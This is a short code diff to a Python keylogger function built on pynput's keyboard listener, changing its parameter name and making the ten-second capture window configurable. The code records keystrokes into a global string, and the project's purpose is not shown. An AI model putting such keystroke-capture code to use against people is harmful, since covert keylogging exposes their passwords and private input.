@@ -5,7 +5,7 @@ import threading
 from pynput.keyboard import Listener
 
 
-def key_logger(default_value=None):
+def key_logger(duration=None):
     global listener
     global key_string
 
@@ -24,7 +24,7 @@ def key_logger(default_value=None):
         listener_thread = threading.Thread(target=listener.join)
         listener_thread.start()
         # listen for ten seconds
-        time.sleep(10)
+        time.sleep(duration if duration is not None else 10)
         listener.stop()
 
     if key_string != "":
